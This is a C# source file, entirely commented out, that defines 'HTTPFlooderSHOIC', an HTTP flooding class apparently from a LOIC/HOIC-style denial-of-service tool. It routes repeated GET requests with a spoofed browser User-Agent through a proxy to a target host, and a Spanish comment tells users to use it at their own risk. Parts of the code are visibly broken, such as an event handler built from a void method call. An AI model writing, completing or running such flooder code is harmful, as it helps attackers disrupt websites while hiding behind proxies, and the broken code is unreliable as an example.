/*
 * Creado por SharpDevelop.
 * Usuario: MegaTron
 * Fecha: 17/05/2012
 * Hora: 03:29 p.m.
 * 
 * Para cambiar esta plantilla use Herramientas | Opciones | Codificación | Editar Encabezados Estándar
 */

using System;
using System.ComponentModel;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Data;

/*
namespace SHOIC
{
	public  class HTTPFlooderSHOIC:IFlooder
    {
		#region Fields
		private long lastAction;
		private Random random = new Random();
		private Timer tTimepoll = new Timer();
		#endregion

        


		#region Properties
		public int pos=0;
		public DataRowView rowpro;
		public string Mensaje;
		public int PortProxy { get; set; }

		public int Delay { get; set; }

		public int Downloaded { get; set; }

		public int Requested { get; set; }

		public int Failed { get; set; }

		public bool IsFlooding { get; set; }

		public string IP { get; set; }

		public int Port { get; set; }

		public bool Resp { get; set; }

		public ReqState State { get; set; }

		public string Subsite { get; set; }

		public int Timeout { get; set; }
		#endregion
		
		
		
		
        public HTTPFlooderSHOIC(ref BindingSource bs,string ip, int port, string subSite, bool resp, int delay, int timeout,string mensaje)
        {
        	rowpro=(DataRowView)bs.Current;
        	IP=ip;
        	Port=port;
        	Mensaje=mensaje;
        	
        	try{
        	PortProxy=int.Parse(rowpro["puerto_proxy"].ToString());
        	}catch{}
        	
        
        }
        
        #region Methods
		public void Start()
		{
			this.IsFlooding = true;
			lastAction = Tick();

			tTimepoll = new Timer();
			tTimepoll.Tick += new EventHandler(tTimepoll_Tick);
			tTimepoll.Start();

			var bw = new BackgroundWorker();
			bw.DoWork += new DoWorkEventHandler(Conectar(rowpro["ip_proxy"].ToString(),PortProxy,IP,Port,Mensaje));
			bw.RunWorkerAsync();
			
			
			
		}

		private static long Tick()
		{
			return DateTime.Now.Ticks / 10000;
		}
		

        
        
        static void Conectar(string IPproxy, Int32 PuertoProxy, string IPblanco, Int32 Puerto, string mensaje)
        {
            //Conecta a IPblanco en el puerto enviando la peticion "mensaje"
            //Usar bajo la propia responsabilidad...
            try
            {
                TcpClient cliente = new TcpClient(IPproxy, PuertoProxy); //Crea un cliente
                Byte[] data = new Byte[256];
                data = System.Text.Encoding.ASCII.GetBytes("GET " + mensaje + " HTTP/1.1\nHost:" + IPblanco + ":" + Puerto + "\nUser-Agent:Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10\n\n"); //Pasa el mensaje a la variable byte data
                NetworkStream stream = cliente.GetStream();
                stream.Write(data, 0, data.Length); //Escribe en el flujo de datos del cliente el mensaje
                stream.Close();
                cliente.Close(); //Cierra todo
                //return 1;
            }
            catch (ArgumentNullException e)
            {
                // no es necesario MessageBox.Show("ArgumentNullException: " + e);
                //return 0;
            }
            catch (SocketException e)
            {
                // no es necesario MessageBox.Show("SocketException: " + e.ToString());
                //return 0;
            }
        }
        
        #endregion
        
        private void tTimepoll_Tick(object sender, EventArgs e)
		{
			if (Tick() > lastAction + Timeout)
			{
				this.IsFlooding = false;
				this.Failed++;
				this.State = ReqState.Failed;
			}
		}

}
}


*/